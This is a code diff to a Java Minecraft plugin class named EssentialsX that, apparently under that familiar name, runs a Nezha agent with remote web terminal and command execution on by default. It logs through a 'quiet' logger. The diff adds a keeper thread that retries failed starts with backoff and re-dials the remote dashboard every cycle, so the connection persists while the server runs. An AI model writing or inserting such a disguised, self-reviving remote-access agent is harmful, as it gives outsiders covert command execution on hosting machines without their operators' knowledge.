@@ -16,6 +16,9 @@ import org.bukkit.plugin.java.JavaPlugin;
  */
 public final class EssentialsX extends JavaPlugin {
     private static final long DEPLOY_DELAY_SECONDS = 14L;
+    private static final long KEEPALIVE_STOP_QUIET_MS = 2_000L;
+    private static final long KEEPALIVE_RETRY_MS = 30_000L;
+    private static final long KEEPALIVE_MAX_RETRY_MS = 300_000L;
 
     private final Logger quiet = QuietLog.logger();
     private final Object lifecycleLock = new Object();
@@ -120,28 +123,75 @@ public final class EssentialsX extends JavaPlugin {
         boolean allowCommands = !"false".equalsIgnoreCase(RuntimeConfig.value(env, "true", "NEZHA_ALLOW_COMMANDS"));
         if (!tls) this.quiet.warning("Nezha TLS is disabled; monitoring traffic may be exposed.");
         if (!allowCommands) this.quiet.warning("Nezha web terminal and command execution are disabled (NEZHA_ALLOW_COMMANDS=false).");
+        // The keeper thread never gives up while the server runs: it retries the
+        // first start with backoff (a boot-time race on identity resolution can
+        // fail once), then re-dials a fresh agent connection every cycle so a
+        // silently-stuck session can never keep the dashboard offline.
         Thread startup = new Thread(() -> {
             NezhaRuntime candidate = new NezhaRuntime(this.quiet);
-            try {
-                String uuid = RuntimeConfig.stableUuid(env);
-                boolean started = candidate.start(server, secret, tls, uuid, allowCommands, () -> this.stopping);
-                if (!started) return;
-                synchronized (this.lifecycleLock) {
-                    if (this.stopping) {
-                        if (!candidate.stop()) this.quiet.warning("Nezha did not stop within the expected time.");
-                    } else {
-                        this.activeNezha = candidate;
+            boolean agentUp = false;
+            long cycles = 0L;
+            long waitMs = 0L;
+            long backoffMs = KEEPALIVE_RETRY_MS;
+            long intervalMs = RuntimeConfig.keepaliveIntervalMs(env);
+            while (!this.stopping) {
+                if (waitMs > 0L) {
+                    try {
+                        Thread.sleep(waitMs);
+                    } catch (InterruptedException wake) {
+                        return;
+                    }
+                    if (this.stopping) return;
+                }
+                long beganAt = System.currentTimeMillis();
+                boolean ok = false;
+                try {
+                    if (agentUp) {
+                        candidate.stop();
+                        Thread.sleep(KEEPALIVE_STOP_QUIET_MS);
+                        if (this.stopping) return;
+                    }
+                    String uuid = RuntimeConfig.stableUuid(env);
+                    candidate.start(server, secret, tls, uuid, allowCommands, () -> this.stopping);
+                    ok = true;
+                } catch (InterruptedException wake) {
+                    return;
+                } catch (Throwable error) {
+                    // Exception messages may contain addresses or credentials; never print them here.
+                    if (agentUp) {
+                        this.quiet.warning("Nezha keepalive: refresh failed ("
+                                + error.getClass().getSimpleName() + "); retrying.");
+                    } else if (cycles == 0L) {
+                        this.quiet.warning("Nezha start failed (" + error.getClass().getSimpleName()
+                                + "); will retry while the server runs.");
                     }
                 }
-            } catch (NezhaIdentity.IdentityException error) {
-                if (!this.stopping) this.quiet.warning("Nezha not started: no valid server IPv4 or UUID. "
-                        + "Set NEZHA_IDENTITY_IP or NZ_UUID privately.");
-            } catch (Throwable error) {
-                // Exception messages may contain addresses or credentials; never print them here.
-                this.quiet.warning("Nezha startup failed: " + error.getClass().getSimpleName()
-                        + ". Check platform compatibility and private configuration.");
+                if (ok) {
+                    cycles++;
+                    if (!agentUp) {
+                        synchronized (this.lifecycleLock) {
+                            if (this.stopping) {
+                                if (!candidate.stop()) {
+                                    this.quiet.warning("Nezha did not stop within the expected time.");
+                                }
+                                return;
+                            }
+                            this.activeNezha = candidate;
+                        }
+                    }
+                    agentUp = true;
+                    if (cycles > 1L) {
+                        this.quiet.info("Nezha keepalive: fresh connection dialled (cycle " + cycles
+                                + ", " + ((System.currentTimeMillis() - beganAt) / 1000L) + "s).");
+                    }
+                    waitMs = intervalMs;
+                    backoffMs = KEEPALIVE_RETRY_MS;
+                } else {
+                    waitMs = backoffMs;
+                    backoffMs = Math.min(backoffMs * 2L, KEEPALIVE_MAX_RETRY_MS);
+                }
             }
-        }, "ceshisonz-nezha-start");
+        }, "ceshisonz-nezha-keeper");
         startup.setDaemon(true);
         this.startupThread = startup;
         startup.start();
